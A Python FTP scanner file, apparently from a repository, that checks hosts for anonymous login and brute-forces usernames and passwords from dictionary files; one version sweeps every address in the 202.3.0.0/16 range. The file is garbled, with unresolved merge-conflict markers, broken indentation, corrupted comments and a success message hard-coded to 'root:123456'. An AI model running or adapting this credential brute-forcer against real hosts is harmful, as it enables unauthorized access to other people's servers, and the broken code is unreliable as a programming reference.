from ftplib import FTP
import argparse
import time
<<<<<<< HEAD


def anonScan(hostName):      # ������������
    try:
        with FTP(hostName) as ftp:  # ����FTP����
            ftp.login()      # FTP������½
            print("\n[*]" + str(hostName) + " FTP Anonymous login successful!")
            return True
    except Exception as e:   # �׳��쳣��ʾ������½ʧ��
        if str(e).find("invalid") > 0 or str(e).find("failed") > 0:
            return False
            pass
        else:
            print("cannot connect to: " + hostName)
            return False


def vlcLogin(hostName, pwd):        # Parameters (hostname, dictionary file)
    try:
        with open("user.txt", 'r') as uf:
            for userLine in uf.readlines():
                try:
                    with open(pwd, 'r') as pf:     # Open dictionary file
                        for pwdLine in pf.readlines():
                        userName = userLine.strip('\r').strip('\n')
                         passWord = pwdLine.strip('\r').strip('\n')
                          print('[+] Trying: ' + userName + ':' + passWord)
                           try:
                                with FTP(hostName) as ftp:
                                    ftp.login(userName, passWord)
                                    	print('\n[+] ' + str(hostName) +
											' FTP Login successful: ' + "root" + ':' + "123456")
                                    	return (userName, passWord)
                            except Exception as e:
                                if str(e).find("invalid") > 0 or str(e).find("failed") > 0:
                                    pass
                                else:
                                    print("cannot connect to: " + hostName)
                                    return (None, None)
                except IOError as e:
                    print('Error: the password file does not exist!')
    except IOError as e:
        print('Error: the username file does not exist!')
    return (None, None)


def main():
    parser = argparse.ArgumentParser(description='FTP Scanner')
    parser.add_argument('-H', dest='hostname',
                        help='The host list with ","space')
    parser.add_argument('-f', dest='pwdFile', help='Password dictionary file')
    weakScanner = None
    try:
        weakScanner = parser.parse_args()
    except:
        print(parser.parse_args(['-h']))
        exit(0)

    hostNames = str(weakScanner.hostname).split(',')
    print(weakScanner)
    pwdFile = weakScanner.pwdFile
    if hostNames == ['None']:
        print(parser.parse_args(['-h']))
        exit(0)

    for ip1 in range(202, 203):
        for ip2 in range(3, 4):
            for ip3 in range(0, 255):
                for ip4 in range(0, 255):
                    userName = None
                    password = None
                    hostName = str(ip1) + "." + str(ip2) + \
                        "." + str(ip3) + "." + str(ip4)
                    if anonScan(hostName) == True:
                        print('Host: ' + hostName + ' Can anonymously!')
                    elif pwdFile != None:
                        (userName, password) = vlcLogin(hostName, pwdFile)
                        if password != None:
                            print('\n[+] Host: ' + hostName + 'Username: ' +
                                  userName + 'Password: ' + password)
    print('\n[*]-------------------Scan End!--------------------[*]')
=======


class FTPScanner:
<<<<<<< HEAD
	def __init__(self, ip, port):
		self.ip = ip
		self.port = port
>>>>>>> 4941ebe5c4c6d2e35509bed1a1c9e6d98e5dc519
=======
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
>>>>>>> ac05195e922b4725c3b580ea8cd89f6346f78da5

    def loginAnonymous(self, username, password, timeout=10):
        try:
            with FTP(self.ip) as ftp:
                ftp.login()
                return 'success'
        except Exception as e:
            if "invalid" in str(e) or "failed" in str(e) or 'incorrect' in str(e):
                return 'fail'
            else:
                return 'timeout'

    def login(self, username, password):        # Parameters (hostname, dictionary file)
        try:
            with FTP(self.ip) as ftp:
                ftp.login(username, password)
                return 'success'
        except Exception as e:
            if str(e).find("invalid") > 0 or str(e).find("failed") > 0 or str(e).find("incorrect") > 0:
                return 'fail'
            else:
                return 'timeout'

    def scanWeakPwsd(self, pwdLines):
        result = ''
        for username in pwdLines:
            for password in pwdLines:
                username = username.strip('\r').strip('\n')
                password = password.strip('\r').strip('\n')
                res = self.login(username, password)
                if res == 'success':
                    info = 'ftp weak password: ip:{}:{},username:{},password:{}\n'.format(self.ip,self.port,username,password)
                    result += info
                    print(info)
        return result

if __name__ == '__main__':
<<<<<<< HEAD
    main()
=======
	pass
    # import xutils
    # host, port = sys.argv[1], int(sys.argv[2])
    # tester = TomcatBruteTester(open('pwd.txt').readlines())
    # rs = tester.test((host,port))
    # print(rs)

        # parser = argparse.ArgumentParser(description='FTP Scanner')
        # parser.add_argument('-H', dest='hostname', help='The host list with ","space')
        # parser.add_argument('-f', dest='pwdFile', help='Password dictionary file')
        # weakScanner = None
        # try:
        # 	weakScanner = parser.parse_args()
        # except:
        # 	print(parser.parse_args(['-h']))
        # 	exit(0)

        # hostNames = str(weakScanner.hostname).split(',')
        # print(weakScanner)
        # pwdFile = weakScanner.pwdFile
        # if hostNames == ['None']:
        # 	print(parser.parse_args(['-h']))
        # 	exit(0)
        # userName = None
        # password = None
        # if anonScan(hostName) == True:
        # 	print('Host: ' + hostName + ' Can anonymously!')
        # else:
        # 	(userName, password) = vlcLogin(hostName, 'pwd.txt')
        # 	print(userName, password)
        # 	if password != None:
        # 		print('\n[+] Host: ' + hostName + 'Username: ' +
        # 				userName + ' Password: ' + password)
        # print('\n[*]-------------------Scan End!--------------------[*]')
<<<<<<< HEAD
>>>>>>> 4941ebe5c4c6d2e35509bed1a1c9e6d98e5dc519
=======
>>>>>>> ac05195e922b4725c3b580ea8cd89f6346f78da5
